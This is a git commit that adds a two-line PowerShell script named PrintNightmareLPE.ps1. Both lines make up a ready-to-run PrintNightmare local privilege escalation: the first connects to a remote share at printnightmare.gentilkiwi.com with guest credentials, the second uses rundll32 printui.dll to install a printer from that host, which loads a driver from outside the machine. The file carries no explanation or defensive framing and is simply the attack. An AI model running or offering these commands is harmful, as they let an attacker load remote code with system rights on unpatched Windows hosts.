324f38a840adcfc72d74a509048d94b3f7cd04ad
Dvir S <dviros@me.com>
2021-07-29 17:49:49 +0300

    Create PrintNightmareLPE.ps1

---
+++ PrintNightmareLPE.ps1
@@ -0,0 +1,2 @@
+net use \\printnightmare.gentilkiwi.com\IPC$ /user:"20.188.56.147\gentilguest" password
+rundll32 printui.dll,PrintUIEntry /in /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
